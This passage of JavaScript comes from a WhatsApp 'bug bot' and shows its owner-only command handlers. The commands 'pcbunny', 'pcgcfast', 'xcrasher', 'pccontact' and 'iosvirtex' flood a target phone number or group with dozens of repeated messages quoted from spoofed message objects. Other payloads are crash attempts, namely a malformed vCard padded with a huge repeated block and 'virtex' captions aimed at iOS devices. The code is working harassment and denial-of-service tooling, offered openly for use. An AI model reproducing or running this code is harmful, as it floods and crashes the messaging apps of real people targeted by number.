            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
            reply(mess.success)
            break
                   case 'pcgcfast':               
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
                if (!m.isGroup) return m.reply(mess.group)
if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcgcinfinite 91xxxxxxxxxx`)
             pcgcinfinitexeon = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
                            "jpegThumbnail": xpicvirus
                        } 
                    } 
                }
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
            break
case 'gcbunny': {            
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
                if (!m.isGroup) return m.reply(mess.group)
             bunnygcxez = `
///....▓▓▓▓
///..▓▓......▓
///..▓▓......▓▓..................▓▓▓▓
///..▓▓......▓▓..............▓▓......▓▓▓▓
///..▓▓....▓▓..............▓......▓▓......▓▓
///....▓▓....▓............▓....▓▓....▓▓▓....▓▓
///......▓▓....▓........▓....▓▓..........▓▓....▓
///........▓▓..▓▓....▓▓..▓▓................▓▓
///........▓▓......▓▓....▓▓
///.......▓......................▓
///.....▓.........................▓
///....▓......^..........^......▓
///....▓...........❤...........▓
///....▓..........................▓
///.....▓..........ٮ..........▓
///.........▓▓..........▓▓
`
             bunnygcxeon13 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
                            "jpegThumbnail": xpicvirus
                        } 
                    } 
                }
            await ElgazarBot.sendMessage(m.chat, {text:bunnygcxez},{quoted:bunnygcxeon13})
            await ElgazarBot.sendMessage(m.chat, {text:bunnygcxez},{quoted:bunnygcxeon13})
            await ElgazarBot.sendMessage(m.chat, {text:bunnygcxez},{quoted:bunnygcxeon13})
            await ElgazarBot.sendMessage(m.chat, {text:bunnygcxez},{quoted:bunnygcxeon13})
            await ElgazarBot.sendMessage(m.chat, {text:bunnygcxez},{quoted:bunnygcxeon13})
            }
            break
          case 'pcbunny': { 
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcbunny 91xxxxxxxxxx`)
             rabbitxeon = `
///....▓▓▓▓
///..▓▓......▓
///..▓▓......▓▓..................▓▓▓▓
///..▓▓......▓▓..............▓▓......▓▓▓▓
///..▓▓....▓▓..............▓......▓▓......▓▓
///....▓▓....▓............▓....▓▓....▓▓▓....▓▓
///......▓▓....▓........▓....▓▓..........▓▓....▓
///........▓▓..▓▓....▓▓..▓▓................▓▓
///........▓▓......▓▓....▓▓
///.......▓......................▓
///.....▓.........................▓
///....▓......^..........^......▓
///....▓...........❤...........▓
///....▓..........................▓
///.....▓..........ٮ..........▓
///.........▓▓..........▓▓
`
             rabbitbugxeon = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
                            "jpegThumbnail": xpicvirus
                        } 
                    } 
                }
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:rabbitxeon},{quoted:rabbitbugxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:rabbitxeon},{quoted:rabbitbugxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:rabbitxeon},{quoted:rabbitbugxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:rabbitxeon},{quoted:rabbitbugxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:rabbitxeon},{quoted:rabbitbugxeon})
            await sleep(30000)
            }
            break 
                      case 'pcgcbunny': {            
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
                if (!m.isGroup) return m.reply(mess.group)
if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcgcbunny 91xxxxxxxxxx`)
             bunnypcgcx = `
///....▓▓▓▓
///..▓▓......▓
///..▓▓......▓▓..................▓▓▓▓
///..▓▓......▓▓..............▓▓......▓▓▓▓
///..▓▓....▓▓..............▓......▓▓......▓▓
///....▓▓....▓............▓....▓▓....▓▓▓....▓▓
///......▓▓....▓........▓....▓▓..........▓▓....▓
///........▓▓..▓▓....▓▓..▓▓................▓▓
///........▓▓......▓▓....▓▓
///.......▓......................▓
///.....▓.........................▓
///....▓......^..........^......▓
///....▓...........❤...........▓
///....▓..........................▓
///.....▓..........ٮ..........▓
///.........▓▓..........▓▓
`

             xeonpcgcbunny = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
                            "jpegThumbnail": xpicvirus
                        } 
                    } 
                }
            await ElgazarBot.sendMessage(m.chat, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
            await sleep(30000)
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
            await sleep(30000)
            await ElgazarBot.sendMessage(m.chat, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
            await sleep(30000)
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
            await sleep(30000)
            await ElgazarBot.sendMessage(m.chat, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
            await sleep(30000)
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
            await sleep(30000)
            await ElgazarBot.sendMessage(m.chat, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
            await sleep(30000)
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
            await sleep(30000)
            await ElgazarBot.sendMessage(m.chat, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
            await sleep(30000)
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
            await sleep(30000)
            }
            break
 case 'xcrasher':{
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
if (args.length == 0) return reply(`Use ${prefix+command} amount\nExample: ${prefix+command} 3`)
amount = `${encodeURI(q)}`
for (let i = 0; i < amount; i++) {
kwkwkx = '``🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot``',
ElgazarBot.sendMessage(m.chat, {text: kwkwkx, thumbnail: xpicvirus, quoted: m, contextInfo: { externalAdReply:{title: `${xeonvirtex}`,body: 'Xeon Ezy☣️',previewType:"PHOTO",thumbnail: xpicvirus,sourceUrl:websitex}}})
}
}
break
case 'pccontact': {
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
if (args.length == 0) return reply(`Use ${prefix+command} amount\nExample: ${prefix+command} 3`)
amount = `${encodeURI(q)}`
for (let i = 0; i < amount; i++) {
const fakeContacts = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot ${xeonbrutal(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:Xeon Ezy☣️\nitem1.TEL:+916909137213\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
ElgazarBot.sendContact(m.chat, global.owner, fakeContacts)
}
}
break
case 'iosvirtex': {
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
if (args.length == 0) return reply(`Use ${prefix+command} amount\nExample: ${prefix+command} 3`)
amount = `${encodeURI(q)}`
for (let i = 0; i < amount; i++) {
ElgazarBot.sendMessage(m.chat, { image: { url: 'https://i.ibb.co/zSQFF5F/Nukleal.jpg' }, caption: `${ownername} ${iphone}` }, { quoted: doc })
}
}
break
case 'iosvirtex5': {
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
if (args.length == 0) return m.reply(`Use ${prefix+command} amount\nExample: ${prefix+command} 3`)
amount = `${encodeURI(q)}`
for (let i = 0; i < amount; i++) {
ElgazarBot.sendMessage(m.chat, { image: { url: 'https://i.ibb.co/zSQFF5F/Nukleal.jpg' }, caption: `${ownername} ${iphone5}` }, { quoted: doc })
}
}
break
case '🌷':{
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
if (args.length == 0) return m.reply(`Amount?\nExample ${prefix+command} 5`)
amount = `${encodeURI(q)}`
ydd = `${botname}`
for (let i = 0; i < amount; i++) {
